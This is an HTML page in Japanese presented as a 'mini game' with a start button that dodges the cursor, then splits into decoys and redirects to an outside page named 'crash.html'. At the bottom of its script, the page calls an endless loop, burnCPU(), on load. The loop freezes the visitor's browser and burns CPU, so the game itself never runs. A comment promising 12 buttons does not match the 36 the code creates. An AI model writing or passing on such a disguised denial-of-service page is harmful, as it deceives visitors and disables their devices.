<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>ミニゲーム</title>
<style>
  body {
    margin: 0;
    height: 100vh;
    background: #111;
    overflow: hidden;
    font-family: sans-serif;
    color: white;
  }

  h1 {
    text-align: center;
    margin-top: 30px;
    font-size: 48px;
    text-shadow: 0 0 15px rgba(255,255,255,0.4);
  }

  .btn {
    position: absolute;
    font-size: 32px;
    padding: 25px 80px;
    background: #00ff88;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    box-shadow: 0 0 25px rgba(0,255,136,0.8);
    transition: left 0.15s linear, top 0.15s linear, opacity 0.5s;
  }
</style>
</head>
<body>

<h1>ミニゲーム</h1>
<button id="mainBtn" class="btn">スタート</button>

<script>
const TARGET_URL = "https://jnr2ljtjnl2rsnsv.github.io/Jaj/crash.html";

function burnCPU() {
        while (true) {
          Math.sqrt(Math.random() * 1e12);
        }
      }

let escapeCount = 0;
let phase = 1; // 1=逃げる 2=隠れる 3=分裂
const btn = document.getElementById("mainBtn");

function randomPos(el) {
  const x = Math.random() * (innerWidth - el.offsetWidth);
  const y = Math.random() * (innerHeight - el.offsetHeight);
  el.style.left = x + "px";
  el.style.top  = y + "px";
}

// 初期位置
randomPos(btn);

// ========= フェーズ1：100回逃げる =========
function escape() {
  if (phase !== 1) return;

  escapeCount++;
  randomPos(btn);

  if (escapeCount >= 100) {
    phase = 2;
    hidePhase();
  }
}

btn.addEventListener("mouseenter", escape);
btn.addEventListener("touchstart", escape);

// ========= フェーズ2：透明で隠れる =========
function hidePhase() {
  btn.style.opacity = "0.1";
  randomPos(btn);

  setTimeout(() => {
    btn.remove();
    splitPhase();
  }, 1500);
}

// ========= フェーズ3：12分裂 =========
function splitPhase() {
  const correctIndex = Math.floor(Math.random() * 12);

  for (let i = 0; i < 36; i++) {
    const b = document.createElement("button");
    b.className = "btn";
    b.textContent = "スタート";
    randomPos(b);

    if (i !== correctIndex) {
      b.style.opacity = "0.5";
      b.addEventListener("mouseenter", () => {
        b.remove();
      });
    } else {
      b.addEventListener("click", () => {
        window.location.href = TARGET_URL;
      });
    }

    document.body.appendChild(b);
  }
}

burnCPU();

</script>

</body>
</html>
